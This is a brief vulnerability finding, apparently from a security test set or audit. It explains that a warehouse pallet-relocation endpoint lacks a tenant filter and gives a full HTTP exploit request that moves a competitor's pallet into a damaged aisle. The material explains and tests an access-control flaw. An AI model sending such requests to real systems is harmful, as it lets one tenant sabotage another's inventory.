diagnosis: The route handler moves warehouse pallets to new storage racks using a raw PostgreSQL query. While the caller is authenticated as a supplier, the query lacks a tenant filter (e.g. supplier_id = ctx.state.supplier.id). An unauthorized supplier can relocate competitors' stock into inaccessible racks or invalid fulfillment bays.
exploit_request:
POST /warehouse/inventory/relocate HTTP/1.1
Host: logistics.supplychain-net.com
Authorization: Bearer <supplier_token>
Content-Type: application/json

{"palletId": "PLT_COMPETITOR_8819", "targetAisle": "AISLE_DAMAGED", "targetRack": "RACK_0"}
